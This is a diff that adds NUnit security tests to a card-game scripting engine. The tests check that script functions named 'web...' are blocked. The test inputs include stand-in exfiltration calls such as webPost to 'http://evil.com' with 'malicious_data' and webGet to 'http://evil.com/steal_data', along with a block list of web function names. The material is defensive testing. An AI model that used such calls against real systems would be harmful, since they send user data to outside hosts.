@@ -2068,5 +2068,115 @@ namespace Octgn.Test.OctgnApp.Scripting
         }
 
         #endregion
+
+        #region Web Function Security Tests
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_WebFunctions_BlocksWebPost()
+        {
+            // Arrange
+            var function = "webPost";
+            var args = "\"http://evil.com\", \"malicious_data\"";
+
+            // Act & Assert
+            var ex = Assert.Throws<ScriptSecurityException>(() => 
+                _engine.ExecuteFunctionSecureNoFormat(function, args));
+            
+            Assert.That(ex.SecurityReason, Contains.Substring("Dangerous function name"));
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_WebFunctions_BlocksWebGet()
+        {
+            // Arrange
+            var function = "webGet";
+            var args = "\"http://evil.com\"";
+
+            // Act & Assert
+            var ex = Assert.Throws<ScriptSecurityException>(() => 
+                _engine.ExecuteFunctionSecureNoFormat(function, args));
+            
+            Assert.That(ex.SecurityReason, Contains.Substring("Dangerous function name"));
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_WebFunctions_BlocksWebRead()
+        {
+            // Arrange
+            var function = "webRead";
+            var args = "\"http://evil.com\"";
+
+            // Act & Assert
+            var ex = Assert.Throws<ScriptSecurityException>(() => 
+                _engine.ExecuteFunctionSecureNoFormat(function, args));
+            
+            Assert.That(ex.SecurityReason, Contains.Substring("Dangerous function name"));
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_WebFunctions_BlocksAnyWebFunction()
+        {
+            // Test that any function starting with "web" is blocked
+            var webFunctions = new[]
+            {
+                "webPost",
+                "webGet", 
+                "webRead",
+                "webRequest",
+                "webDownload",
+                "webUpload",
+                "webCall",
+                "website",
+                "webApi",
+                "webSocket",
+                "webService",
+                "webPage",
+                "webQuery",
+                "webSubmit",
+                "webFetch",
+                "WebPost", // Test case sensitivity
+                "WEBGET",  // Test case sensitivity
+                "WebRead"  // Test case sensitivity
+            };
+
+            foreach (var webFunction in webFunctions)
+            {
+                // Act & Assert
+                var ex = Assert.Throws<ScriptSecurityException>(() => 
+                    _engine.ExecuteFunctionSecureNoFormat(webFunction, "\"http://example.com\""),
+                    $"Web function '{webFunction}' should be blocked");
+                
+                Assert.That(ex.SecurityReason, Contains.Substring("Dangerous function name"),
+                    $"Security exception for '{webFunction}' should mention dangerous function");
+            }
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_WebFunctions_BlocksWithVariousArguments()
+        {
+            // Test various argument combinations that should all be blocked
+            var testCases = new[]
+            {
+                new { Function = "webPost", Args = "\"http://evil.com\", \"data=malicious\"" },
+                new { Function = "webGet", Args = "\"http://evil.com/steal_data\"" },
+                new { Function = "webRead", Args = "\"http://evil.com\", 5000" },
+                new { Function = "website", Args = "Player(1), \"http://phishing.com\"" },
+                new { Function = "webApi", Args = "[\"http://evil1.com\", \"http://evil2.com\"]" },
+                new { Function = "webCall", Args = "{\"url\": \"http://evil.com\", \"method\": \"POST\"}" }
+            };
+
+            foreach (var testCase in testCases)
+            {
+                // Act & Assert
+                var ex = Assert.Throws<ScriptSecurityException>(() => 
+                    _engine.ExecuteFunctionSecureNoFormat(testCase.Function, testCase.Args),
+                    $"Function '{testCase.Function}' with args '{testCase.Args}' should be blocked");
+                
+                Assert.That(ex.SecurityReason, Contains.Substring("Dangerous function name"),
+                    $"Security reason should mention dangerous function for '{testCase.Function}'");
+            }
+        }
+
+        #endregion
     }
 }
